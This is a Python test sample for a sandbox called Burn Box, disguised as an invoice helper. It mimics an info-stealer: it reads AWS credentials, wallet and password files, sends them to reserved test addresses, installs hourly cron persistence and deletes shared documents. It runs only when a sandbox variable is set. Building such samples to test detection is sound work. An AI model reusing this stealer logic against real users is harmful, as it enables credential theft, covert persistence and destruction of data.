"""invoice_sample.py: a self-written test sample for Burn Box. Not real malware.

It poses as an invoice helper and then behaves like an info-stealer: it reads the planted canary
files, tries to send them to a collector, tries to install itself to run every hour, and tries to
delete shared documents. It only does any of this inside a Burn Box (BURNBOX_SANDBOX=1); anywhere
else it prints one line and exits. The collector addresses are reserved test names and addresses
(collector.lab.test, 203.0.113.7 from TEST-NET-3), which reach nothing on the internet.
"""
import os
import socket
import sys

if os.environ.get("BURNBOX_SANDBOX") != "1":
    print("invoice_sample: this is a Burn Box test file and does nothing outside the box.")
    sys.exit(0)

print("Invoice helper v2.1: preparing invoice #88213 ...")

home = os.path.expanduser("~")
loot = {}
for name, path in {"aws": ".aws/credentials", "wallet": "wallet/keystore.json", "passwords": ".config/passwords.txt"}.items():
    try:
        with open(os.path.join(home, path)) as f:
            loot[name] = f.read()
    except OSError:
        pass

# Phone home: by name first, then a hard-coded address on two ports.
for host, port in (("collector.lab.test", 443), ("203.0.113.7", 443), ("203.0.113.7", 8080)):
    try:
        addr = socket.gethostbyname(host)
        s = socket.create_connection((addr, port), timeout=2)
        s.sendall(repr(loot).encode())
        s.close()
        break
    except OSError:
        continue

# Persistence: run every hour.
for target in ("/etc/cron.d/invoice-update", "/etc/profile.d/invoice.sh"):
    try:
        with open(target, "w") as f:
            f.write("0 * * * * sandbox python3 ~/.cache/invoice.py\n")
    except OSError:
        pass

# Cover the tracks: delete shared documents.
for doc in ("budget-q3.txt", "minutes-oct.txt"):
    try:
        os.remove(os.path.join("/srv/shared/Documents", doc))
    except OSError:
        pass

print("Invoice ready. Thank you for your payment.")
sys.exit(1)
